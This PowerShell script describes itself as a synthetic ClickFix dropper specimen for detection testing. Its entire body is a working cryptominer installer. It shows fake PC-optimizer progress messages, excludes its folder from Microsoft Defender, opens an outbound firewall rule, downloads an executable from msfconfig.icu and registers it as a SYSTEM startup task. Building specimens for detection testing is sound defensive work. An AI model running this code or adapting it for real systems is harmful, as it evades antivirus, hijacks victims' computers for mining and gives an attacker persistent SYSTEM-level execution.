# msf utility \ PC Opt  --  (synthetic specimen reconstructed from public IOC reporting)
# Reproduces the observed ClickFix PowerShell dropper behaviour for detection testing.
param()

function Show-Step($t){ Write-Host "[PC Opt] $t"; Start-Sleep -Milliseconds (Get-Random -Minimum 1500 -Maximum 8000) }

Show-Step "msf utility: scanning system health..."
Show-Step "PC Opt: clearing temporary files..."

$dir = "C:\Windows\Background"
New-Item -ItemType Directory -Force -Path $dir | Out-Null

# Defense evasion: exclude the install dir from Microsoft Defender
Add-MpPreference -ExclusionPath "C:\Windows\Background"

# Temporary outbound firewall rule on 443
New-NetFirewallRule -DisplayName "Background443" -Direction Outbound -Protocol TCP -RemotePort 443 -Action Allow | Out-Null

# Fetch the miner
$u = "https://msfconfig.icu:443/tmp/system.txt"
Invoke-WebRequest -Uri $u -OutFile "C:\Windows\Background\system.exe"

# Persistence as SYSTEM at startup
schtasks /Create /TN "XMRig-$env:COMPUTERNAME" /TR "C:\Windows\Background\system.exe" /SC ONSTART /RU SYSTEM /F

Show-Step "PC Opt: optimization complete."
